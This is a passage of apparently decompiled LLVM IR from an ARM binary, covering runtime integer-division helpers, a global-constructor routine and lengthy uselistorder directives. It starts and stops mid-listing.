  br i1 %v6_1bcd0, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1bcd4 = urem i32 %v1_1bcfc, 2
  %v4_1bcd4 = icmp eq i32 %v3_1bcd4, 0
  %v6_1bcd4 = sub i32 %v1_1bcd4, %v4_1bcd0
  br i1 %v4_1bcd4, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1bcd8 = udiv i32 %v1_1bcf8, 2
  %v6_1bcd8 = or i32 %v1_1bcd8, %v5_1bcd8
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1bce0 = phi i32 [ %v6_1bcd4, %bb93 ], [ %v1_1bcd4, %.thread8 ], [ %v6_1bcd4, %bb94 ]
  %v1_1bce4 = phi i32 [ %v1_1bcd8, %bb93 ], [ %v1_1bcd8, %.thread8 ], [ %v6_1bcd8, %bb94 ]
  %v4_1bcdc = udiv i32 %v1_1bcfc, 4
  %v6_1bcdc = icmp ult i32 %v1_1bce0, %v4_1bcdc
  br i1 %v6_1bcdc, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1bce0 = and i32 %v1_1bcfc, 2
  %v4_1bce0 = icmp eq i32 %v3_1bce0, 0
  %v6_1bce0 = sub i32 %v1_1bce0, %v4_1bcdc
  br i1 %v4_1bce0, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1bce4 = udiv i32 %v1_1bcf8, 4
  %v6_1bce4 = or i32 %v1_1bce4, %v5_1bce4
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1bcec = phi i32 [ %v6_1bce0, %bb95 ], [ %v1_1bce0, %.thread9 ], [ %v6_1bce0, %bb96 ]
  %v1_1bcf0 = phi i32 [ %v1_1bce4, %bb95 ], [ %v1_1bce4, %.thread9 ], [ %v6_1bce4, %bb96 ]
  %v4_1bce8 = udiv i32 %v1_1bcfc, 8
  %v6_1bce8 = icmp ult i32 %v1_1bcec, %v4_1bce8
  br i1 %v6_1bce8, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1bcec = and i32 %v1_1bcfc, 4
  %v4_1bcec = icmp eq i32 %v3_1bcec, 0
  %v6_1bcec = sub i32 %v1_1bcec, %v4_1bce8
  br i1 %v4_1bcec, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1bcf0 = udiv i32 %v1_1bcf8, 8
  %v6_1bcf0 = or i32 %v1_1bcf0, %v5_1bcf0
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1bd08 = phi i32 [ %v1_1bcf0, %bb97 ], [ %v1_1bcf0, %.thread10 ], [ %v6_1bcf0, %bb98 ]
  %v0_1bcf4 = phi i32 [ %v6_1bcec, %bb97 ], [ %v1_1bcec, %.thread10 ], [ %v6_1bcec, %bb98 ]
  %v2_1bcf4 = icmp eq i32 %v0_1bcf4, 0
  br i1 %v2_1bcf4, label %dec_label_pc_1bd04, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1bcf8, 16
  br i1 %tmp, label %dec_label_pc_1bd04, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1bcf8 = udiv i32 %v1_1bcf8, 16
  %v4_1bcfc = udiv i32 %v1_1bcfc, 16
  br label %dec_label_pc_1bcc4

dec_label_pc_1bd04:                               ; preds = %thread-pre-split12, %bb99
  %v1_1bd04 = icmp slt i32 %v2_1bc5c, 0
  br i1 %v1_1bd04, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1bd04
  %v2_1bd08 = sub i32 0, %v1_1bd08
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1bd10, %dec_label_pc_1bd04, %bb100
  %v1_1bd0c = phi i32 [ %v1_1bd08, %dec_label_pc_1bd04 ], [ %v2_1bd08, %bb100 ], [ %v0_1bc5c, %dec_label_pc_1bd10 ], [ %v2_1bd14, %bb101 ], [ %v1_1bd2880, %bb103 ], [ %v2_1bd24, %bb104 ]
  ret i32 %v1_1bd0c

dec_label_pc_1bd10:                               ; preds = %thread-pre-split
  br i1 %v1_1bc58, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1bd10
  %v2_1bd14 = sub i32 0, %v0_1bc5c
  br label %.thread16

dec_label_pc_1bd1c:                               ; preds = %bb86
  br i1 %v3_1bc78, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1bd1c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1bd1c, %bb102
  %v1_1bd2880 = phi i32 [ %v0_1bc5c, %dec_label_pc_1bd1c ], [ 0, %bb102 ]
  br i1 %v9_1bc78, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1bd20 = ashr i32 %v2_1bc5c, 31
  %v2_1bd24 = or i32 %v4_1bd20, 1
  br label %.thread16

dec_label_pc_1bd2c:                               ; preds = %dec_label_pc_1bc80
  %v2_1bd2c = icmp ugt i32 %v1_1bd30, 65535
  br i1 %v2_1bd2c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1bd2c
  %v2_1bd30 = and i32 %v1_1bd30, 32768
  %v3_1bd30 = icmp eq i32 %v2_1bd30, 0
  %v4_1bd30 = udiv i32 %v1_1bd30, 65536
  br i1 %v3_1bd30, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1bd2c
  %v0_1bd3c70 = phi i32 [ %v1_1bd30, %dec_label_pc_1bd2c ], [ %v4_1bd30, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1bd40 = phi i32 [ %v0_1bd3c70, %.thread19 ], [ %v4_1bd30, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1bd3c = icmp ugt i32 %v1_1bd40, 255
  br i1 %v2_1bd3c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1bd40 = and i32 %v1_1bd40, 128
  %v3_1bd40 = icmp eq i32 %v2_1bd40, 0
  %v4_1bd40 = udiv i32 %v1_1bd40, 256
  br i1 %v3_1bd40, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1bd44 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1bd50 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1bd44, %bb108 ]
  %v1_1bd4c = phi i32 [ %v1_1bd40, %bb106 ], [ %v4_1bd40, %bb107 ], [ %v4_1bd40, %bb108 ]
  %v2_1bd48 = icmp ugt i32 %v1_1bd4c, 15
  br i1 %v2_1bd48, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1bd4c = and i32 %v1_1bd4c, 8
  %v3_1bd4c = icmp eq i32 %v2_1bd4c, 0
  %v4_1bd4c = udiv i32 %v1_1bd4c, 16
  br i1 %v3_1bd4c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1bd50 = add nsw i32 %v1_1bd50, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1bd58 = phi i32 [ %v1_1bd50, %.thread20 ], [ %v1_1bd50, %bb109 ], [ %v2_1bd50, %bb110 ]
  %v5_1bd5c = phi i32 [ %v1_1bd4c, %.thread20 ], [ %v4_1bd4c, %bb109 ], [ %v4_1bd4c, %bb110 ]
  %v2_1bd54 = icmp ugt i32 %v5_1bd5c, 3
  %v7_1bd54 = icmp eq i32 %v5_1bd5c, 4
  %v2_1bd58 = xor i1 %v7_1bd54, true
  %v3_1bd58 = and i1 %v2_1bd54, %v2_1bd58
  br i1 %v3_1bd58, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1bd58 = add nsw i32 %v4_1bd58, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1bd5c = phi i32 [ %v4_1bd58, %.thread21 ], [ %v5_1bd58, %bb111 ]
  %v2_1bd5c = xor i1 %v2_1bd54, true
  %v3_1bd5c = or i1 %v7_1bd54, %v2_1bd5c
  br i1 %v3_1bd5c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1bd5c = udiv i32 %v5_1bd5c, 2
  %v9_1bd5c = add i32 %v4_1bd5c, %v8_1bd5c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1bd64 = phi i32 [ %v4_1bd5c, %bb112 ], [ %v9_1bd5c, %bb113 ]
  %v1_1bd60 = icmp slt i32 %v2_1bc5c, 0
  %v6_1bd64 = lshr i32 %v0_1bd64, %v1_1bd64
  %v2_1bd68 = sub i32 0, %v6_1bd64
  %v2_1bd68.v6_1bd64 = select i1 %v1_1bd60, i32 %v2_1bd68, i32 %v6_1bd64
  ret i32 %v2_1bd68.v6_1bd64

dec_label_pc_1bd70:                               ; preds = %entry
  %v0_1bd70 = load i32, i32* @lr, align 4
  %v0_1bd74 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1bd70)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1bd5c, { 1, 0 }
  uselistorder i1 %v7_1bd54, { 1, 0 }
  uselistorder i32 %v4_1bd4c, { 1, 0 }
  uselistorder i32 %v1_1bd4c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1bd40, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1bd40, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1bd30, { 1, 0 }
  uselistorder i32 %v0_1bcf4, { 1, 0 }
  uselistorder i32 %v4_1bce8, { 1, 0 }
  uselistorder i32 %v1_1bcf0, { 1, 2, 0 }
  uselistorder i32 %v4_1bcdc, { 1, 0 }
  uselistorder i32 %v1_1bce4, { 1, 2, 0 }
  uselistorder i32 %v4_1bcd0, { 1, 0 }
  uselistorder i32 %v1_1bcd8, { 1, 2, 0 }
  uselistorder i32 %v1_1bcfc, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1bccc, { 1, 0 }
  uselistorder i32 %v1_1bcf8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1bcb8, { 1, 0 }
  uselistorder i32 %v3_1bcb4, { 1, 0 }
  uselistorder i32 %v1_1bcb4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1bcb0, { 1, 0 }
  uselistorder i32 %v1_1bcb8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1bca4, { 1, 0 }
  uselistorder i32 %v4_1bca0, { 2, 1, 0 }
  uselistorder i32 %v1_1bca4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1bcac.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1bc78, { 1, 0 }
  uselistorder i32 %v1_1bd30, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1bc5c, { 1, 0, 2 }
  uselistorder i32 %v0_1bc5c, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32* @lr, { 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 3, 34, 35, 36, 37, 38, 16, 17, 18, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 86, 56, 55, 0, 57, 58, 1, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 4, 105, 106, 107, 5, 108, 109, 110, 6, 111, 112, 113, 114, 115, 116, 117, 118, 60, 62, 63, 7, 65, 66, 64, 87, 88, 89, 119, 23, 120, 121, 122, 90, 91, 92, 8, 123, 9, 83, 84, 67, 68, 80, 81, 82, 85, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 2, 79, 61, 14, 15, 59, 93, 94, 19, 20, 21, 10, 11, 12, 13, 22 }
  uselistorder i32 3, { 80, 52, 26, 27, 81, 21, 82, 83, 22, 84, 85, 13, 86, 0, 29, 28, 53, 3, 2, 1, 4, 87, 30, 5, 6, 14, 7, 8, 54, 55, 96, 56, 57, 58, 59, 60, 61, 88, 11, 31, 89, 32, 73, 33, 74, 34, 75, 35, 76, 36, 77, 12, 66, 97, 17, 93, 94, 23, 92, 15, 91, 16, 90, 9, 10, 62, 24, 63, 25, 95, 64, 37, 67, 38, 39, 68, 40, 19, 41, 69, 70, 20, 71, 42, 72, 43, 65, 45, 44, 51, 46, 78, 79, 47, 48, 49, 50, 18 }
  uselistorder i32 15, { 2, 1, 5, 3, 8, 0, 4, 6, 7 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 145, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 146, 30, 31, 32, 37, 33, 34, 36, 35, 38, 39, 40, 42, 41, 43, 44, 45, 0, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 147, 76, 148, 77, 149, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 142, 1, 90, 91, 92, 95, 94, 93, 98, 97, 96, 99, 100, 101, 102, 103, 104, 141, 109, 105, 106, 110, 107, 108, 143, 111, 113, 112, 114, 115, 116, 119, 117, 118, 120, 121, 122, 124, 123, 125, 126, 127, 130, 128, 129, 131, 132, 134, 133, 135, 136, 137, 138, 139, 140, 144 }
  uselistorder i32 128, { 12, 17, 0, 6, 7, 10, 5, 23, 24, 1, 22, 8, 18, 19, 2, 3, 11, 20, 21, 4, 14, 9, 13, 15, 16 }
  uselistorder i32 255, { 9, 12, 1, 11, 0, 10, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 15, 11, 16, 12, 17, 13, 18, 14, 19, 20, 21, 25, 22, 26, 23, 27, 24, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 72, 73, 71, 74, 76, 77, 75, 78, 79 }
  uselistorder i32 32768, { 2, 0, 4, 1, 3 }
  uselistorder i32 65535, { 2, 1, 3, 0 }
  uselistorder i32 31, { 13, 10, 4, 14, 2, 1, 0, 5, 7, 6, 8, 3, 15, 16, 11, 9, 12 }
  uselistorder i32 4, { 244, 245, 188, 8, 9, 246, 247, 248, 249, 250, 98, 121, 122, 123, 251, 252, 253, 254, 255, 256, 257, 0, 10, 77, 258, 259, 260, 261, 262, 263, 264, 76, 265, 124, 125, 126, 266, 267, 99, 268, 87, 269, 11, 12, 1, 220, 270, 271, 272, 273, 274, 100, 275, 276, 277, 278, 279, 280, 101, 127, 128, 129, 130, 131, 132, 281, 133, 134, 282, 283, 102, 135, 13, 284, 14, 97, 88, 89, 15, 355, 90, 79, 16, 17, 91, 92, 356, 357, 358, 359, 93, 360, 361, 362, 363, 94, 364, 365, 366, 367, 368, 18, 369, 370, 371, 372, 373, 95, 78, 374, 375, 376, 377, 378, 379, 19, 20, 96, 285, 286, 287, 288, 103, 289, 290, 291, 292, 293, 294, 295, 296, 297, 299, 298, 300, 380, 381, 382, 384, 385, 136, 137, 138, 329, 330, 331, 332, 21, 201, 139, 202, 140, 80, 203, 227, 141, 228, 229, 2, 238, 239, 240, 241, 142, 143, 204, 144, 3, 145, 205, 22, 206, 81, 146, 147, 335, 337, 336, 333, 334, 338, 339, 340, 341, 342, 343, 344, 345, 346, 148, 149, 150, 151, 320, 321, 322, 323, 324, 325, 4, 23, 326, 152, 153, 383, 301, 24, 25, 26, 27, 5, 327, 28, 154, 59, 29, 30, 155, 31, 156, 157, 158, 159, 160, 302, 32, 303, 161, 304, 305, 306, 307, 308, 309, 310, 162, 311, 312, 313, 314, 315, 316, 60, 319, 163, 164, 318, 189, 317, 33, 34, 83, 35, 36, 84, 347, 348, 190, 37, 38, 61, 62, 63, 39, 207, 40, 41, 64, 42, 43, 165, 44, 208, 209, 104, 210, 105, 211, 106, 212, 213, 214, 107, 215, 108, 216, 217, 65, 166, 218, 109, 66, 167, 110, 67, 219, 111, 68, 168, 112, 69, 222, 221, 223, 224, 85, 226, 225, 86, 113, 70, 45, 114, 169, 170, 171, 172, 173, 174, 191, 175, 176, 116, 192, 117, 46, 177, 115, 47, 193, 194, 195, 196, 197, 198, 199, 120, 48, 49, 82, 230, 231, 232, 233, 234, 235, 50, 51, 71, 178, 236, 237, 179, 242, 180, 72, 73, 52, 243, 53, 54, 118, 74, 181, 119, 182, 75, 183, 184, 55, 328, 56, 57, 58, 349, 350, 351, 352, 353, 354, 185, 186, 187, 6, 7, 200 }
  uselistorder i32 2, { 2, 129, 3, 4, 5, 6, 7, 47, 8, 9, 158, 10, 159, 70, 71, 161, 120, 121, 160, 72, 162, 163, 164, 165, 166, 46, 87, 136, 11, 138, 137, 167, 168, 169, 12, 48, 49, 50, 51, 52, 53, 170, 171, 172, 173, 174, 122, 123, 124, 13, 125, 54, 194, 195, 76, 196, 197, 57, 198, 56, 199, 55, 175, 45, 176, 177, 14, 178, 179, 88, 89, 144, 90, 145, 91, 146, 15, 58, 16, 126, 92, 147, 93, 148, 94, 149, 95, 150, 96, 151, 73, 139, 44, 17, 200, 74, 186, 18, 97, 187, 188, 19, 98, 189, 190, 84, 130, 0, 20, 99, 59, 61, 60, 62, 63, 64, 65, 78, 66, 79, 67, 68, 180, 181, 85, 21, 22, 23, 127, 24, 86, 182, 80, 77, 25, 183, 184, 185, 26, 128, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 131, 36, 37, 38, 39, 40, 100, 75, 101, 140, 141, 102, 41, 103, 42, 81, 142, 143, 104, 105, 82, 106, 107, 108, 111, 132, 110, 133, 134, 109, 135, 119, 112, 152, 113, 153, 154, 155, 156, 114, 157, 115, 116, 117, 193, 83, 191, 43, 192, 69, 118 }
  uselistorder i32 16, { 3, 23, 4, 5, 1, 6, 7, 78, 79, 80, 81, 82, 83, 84, 85, 0, 86, 87, 8, 9, 88, 89, 10, 90, 91, 92, 93, 11, 94, 25, 12, 95, 96, 97, 98, 31, 32, 33, 122, 34, 123, 124, 35, 125, 126, 36, 127, 128, 129, 130, 131, 132, 99, 100, 37, 101, 102, 103, 104, 105, 109, 110, 111, 106, 38, 112, 28, 62, 39, 59, 74, 60, 119, 120, 133, 26, 113, 114, 115, 116, 117, 118, 55, 107, 108, 61, 13, 14, 15, 16, 17, 24, 18, 19, 2, 20, 21, 29, 42, 43, 63, 64, 65, 66, 44, 67, 45, 68, 46, 69, 70, 47, 48, 40, 49, 71, 72, 50, 73, 41, 56, 57, 51, 58, 75, 27, 30, 76, 77, 52, 121, 22, 53, 54 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 8, { 68, 28, 3, 4, 16, 5, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 0, 1, 109, 110, 111, 112, 113, 6, 114, 75, 60, 61, 69, 115, 116, 117, 118, 26, 119, 120, 24, 121, 159, 170, 52, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 53, 122, 123, 124, 125, 126, 127, 128, 129, 130, 27, 131, 70, 132, 133, 134, 135, 136, 137, 187, 29, 76, 7, 95, 97, 77, 78, 51, 163, 162, 160, 161, 164, 165, 166, 167, 168, 169, 8, 157, 158, 2, 186, 56, 57, 54, 55, 18, 19, 34, 35, 58, 188, 140, 141, 142, 71, 143, 144, 145, 146, 25, 147, 63, 64, 148, 149, 150, 59, 151, 152, 153, 154, 33, 20, 21, 155, 156, 65, 138, 139, 79, 9, 10, 72, 30, 11, 12, 17, 13, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 66, 22, 14, 67, 23, 15, 90, 91, 62, 92, 93, 94, 32, 50, 48, 49, 31, 47, 45, 46, 44, 42, 43, 41, 40, 38, 39, 73, 74, 37, 36, 96, 98 }
  uselistorder i32 536870912, { 0, 2, 1 }
  uselistorder i1 true, { 0, 1, 2, 44, 3, 47, 4, 5, 6, 7, 43, 50, 8, 10, 9, 51, 48, 11, 12, 13, 14, 15, 16, 49, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 31, 28, 29, 32, 33, 34, 45, 35, 36, 37, 38, 46, 39, 40, 41, 42 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1bd04, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1bcc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1bcacthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1bd84 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1bd84
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1bd9c = load i32, i32* @global_var_28718.1069, align 4
  %v7_1bda0 = icmp eq i32 %v3_1bd9c, -1
  %v3_1bda4 = load i32, i32* @r4, align 4
  store i32 %v3_1bda4, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_28718.1069 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_1bda0, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_1bda4, i32* %r4.global-to-local, align 4
  %v9_1bdac = load i32, i32* @r0, align 4
  ret i32 %v9_1bdac

.preheader:                                       ; preds = %entry, %.preheader
  %v0_1bdb4 = phi i32 [ %v3_1bdb8, %.preheader ], [ %v3_1bd9c, %entry ]
  call void @__pseudo_branch(i32 %v0_1bdb4)
  %v0_1bdb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bdb8 = add i32 %v0_1bdb8, -4
  %v2_1bdb8 = inttoptr i32 %v1_1bdb8 to i32*
  %v3_1bdb8 = load i32, i32* %v2_1bdb8, align 4
  store i32 %v1_1bdb8, i32* %r4.global-to-local, align 4
  %v3_1bdbc = icmp eq i32 %v3_1bdb8, -1
  br i1 %v3_1bdbc, label %dec_label_pc_1bdc4, label %.preheader

dec_label_pc_1bdc4:                               ; preds = %.preheader
  %v2_1bdc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1bdc4, i32* %r4.global-to-local, align 4
  %v8_1bdc4 = load i32, i32* @r0, align 4
  ret i32 %v8_1bdc4

; uselistorder directives
  uselistorder i32 %v3_1bdb8, { 1, 0 }
  uselistorder i32 %v3_1bd9c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 63, 21, 22, 55, 23, 31, 64, 65, 66, 15, 32, 33, 34, 67, 68, 69, 16, 35, 36, 37, 70, 71, 72, 17, 38, 39, 73, 30, 29, 74, 75, 76, 28, 27, 26, 25, 40, 41, 42, 43, 44, 12, 45, 13, 46, 14, 77, 24, 47, 19, 56, 0, 52, 53, 54, 60, 61, 62, 48, 20, 18, 57, 58, 59, 49, 50, 1, 51, 3, 4, 5, 6, 7, 8, 9, 10, 11, 2 }
  uselistorder i32 -1, { 187, 0, 188, 1, 2, 60, 61, 3, 289, 189, 290, 291, 190, 292, 83, 293, 160, 4, 294, 84, 5, 6, 85, 266, 7, 8, 9, 91, 89, 86, 267, 141, 142, 90, 88, 87, 164, 268, 295, 191, 192, 80, 47, 193, 10, 67, 73, 74, 296, 194, 11, 48, 92, 297, 195, 196, 298, 299, 300, 93, 301, 94, 302, 95, 197, 68, 96, 13, 14, 166, 62, 63, 165, 303, 70, 69, 64, 65, 198, 144, 145, 199, 200, 12, 306, 307, 201, 81, 49, 202, 308, 15, 50, 203, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 204, 75, 309, 206, 310, 311, 82, 76, 77, 312, 313, 314, 315, 316, 78, 167, 317, 150, 205, 168, 318, 319, 320, 207, 169, 170, 16, 321, 208, 209, 322, 323, 171, 97, 337, 98, 343, 99, 278, 100, 363, 101, 364, 102, 365, 103, 338, 104, 366, 17, 18, 210, 19, 105, 279, 280, 211, 212, 213, 276, 172, 173, 106, 20, 281, 21, 269, 72, 214, 22, 270, 215, 174, 216, 23, 24, 71, 51, 52, 217, 218, 219, 66, 282, 220, 283, 25, 26, 107, 305, 108, 277, 109, 284, 110, 344, 111, 334, 112, 288, 113, 275, 114, 304, 175, 332, 115, 333, 221, 116, 222, 324, 223, 224, 225, 117, 226, 227, 228, 229, 230, 231, 53, 54, 232, 159, 118, 325, 233, 176, 326, 55, 327, 328, 177, 27, 234, 235, 146, 151, 149, 28, 152, 31, 29, 30, 153, 178, 329, 330, 236, 119, 331, 56, 285, 120, 345, 121, 286, 122, 367, 368, 123, 271, 124, 335, 125, 336, 126, 272, 127, 339, 128, 369, 129, 346, 130, 373, 131, 340, 132, 347, 133, 372, 134, 287, 135, 341, 136, 342, 137, 273, 138, 274, 139, 370, 79, 371, 57, 58, 237, 238, 239, 240, 241, 242, 147, 140, 179, 32, 33, 243, 244, 245, 38, 39, 40, 34, 35, 36, 37, 246, 247, 248, 249, 250, 180, 181, 251, 252, 253, 254, 255, 41, 59, 42, 43, 143, 182, 183, 44, 148, 256, 257, 161, 162, 163, 45, 258, 154, 155, 156, 157, 158, 46, 259, 260, 261, 262, 263, 264, 265, 184, 185, 186 }
  uselistorder i32* @global_var_28718.1069, { 1, 0 }
  uselistorder i32 1, { 540, 185, 987, 357, 988, 989, 990, 991, 992, 993, 994, 541, 274, 275, 276, 273, 542, 179, 995, 996, 455, 543, 64, 65, 62, 66, 61, 63, 997, 998, 999, 1000, 1001, 1002, 1003, 544, 283, 281, 282, 278, 277, 279, 280, 1004, 456, 1005, 1006, 545, 73, 72, 71, 67, 68, 70, 69, 1007, 1008, 1009, 1010, 457, 1011, 1012, 1013, 1014, 1015, 1016, 546, 525, 86, 85, 87, 1017, 228, 1018, 397, 1019, 1020, 1021, 435, 1022, 1023, 1024, 458, 459, 1025, 1026, 547, 284, 285, 287, 286, 289, 288, 548, 1027, 549, 166, 165, 164, 167, 1028, 550, 83, 84, 1029, 1030, 1031, 1032, 551, 8, 9, 892, 893, 894, 895, 896, 897, 898, 899, 900, 554, 553, 552, 200, 201, 202, 901, 902, 903, 904, 905, 558, 557, 556, 555, 189, 188, 194, 190, 193, 192, 191, 195, 196, 187, 197, 398, 1033, 1034, 399, 1035, 1036, 1037, 1038, 1039, 460, 1040, 1041, 1042, 1043, 1044, 560, 559, 77, 75, 79, 76, 80, 81, 82, 74, 78, 374, 1049, 1045, 1046, 1047, 1048, 421, 561, 117, 118, 119, 1050, 562, 940, 941, 942, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 563, 248, 249, 242, 243, 244, 245, 247, 246, 382, 1069, 1066, 1067, 1068, 362, 383, 223, 226, 222, 224, 225, 1070, 1071, 1072, 1073, 1074, 1075, 564, 217, 215, 218, 216, 219, 220, 400, 1076, 1077, 461, 1078, 566, 565, 205, 206, 207, 568, 567, 199, 198, 221, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 384, 1093, 571, 570, 569, 292, 291, 290, 294, 293, 385, 462, 1094, 572, 213, 211, 210, 214, 212, 1095, 1096, 574, 573, 296, 298, 297, 295, 299, 1097, 1098, 1099, 1100, 1101, 576, 575, 124, 125, 577, 123, 1103, 401, 1102, 386, 363, 1105, 402, 1104, 0, 1108, 1109, 1110, 1111, 580, 579, 578, 229, 230, 1112, 1113, 1114, 1115, 1116, 436, 1117, 1118, 437, 1120, 463, 1121, 429, 430, 440, 1, 438, 439, 1122, 1119, 464, 1123, 425, 587, 586, 526, 585, 584, 527, 583, 582, 581, 375, 424, 1236, 1237, 1238, 1239, 1240, 403, 588, 102, 943, 944, 945, 589, 302, 303, 301, 300, 1124, 387, 1125, 1279, 388, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 528, 591, 590, 40, 41, 42, 43, 38, 37, 36, 39, 45, 44, 389, 404, 1126, 465, 1127, 1130, 466, 371, 405, 368, 431, 432, 1131, 467, 1132, 1133, 1134, 1135, 406, 1136, 358, 1137, 1138, 468, 1139, 1140, 604, 603, 602, 601, 600, 599, 598, 597, 596, 595, 594, 593, 592, 529, 23, 25, 28, 30, 24, 21, 22, 31, 27, 26, 20, 18, 19, 29, 32, 33, 34, 1141, 1142, 530, 605, 49, 47, 52, 54, 50, 51, 48, 53, 1143, 1144, 1145, 1146, 369, 1147, 1148, 1149, 606, 57, 58, 55, 59, 56, 1155, 1156, 607, 180, 1150, 1151, 1152, 1153, 1154, 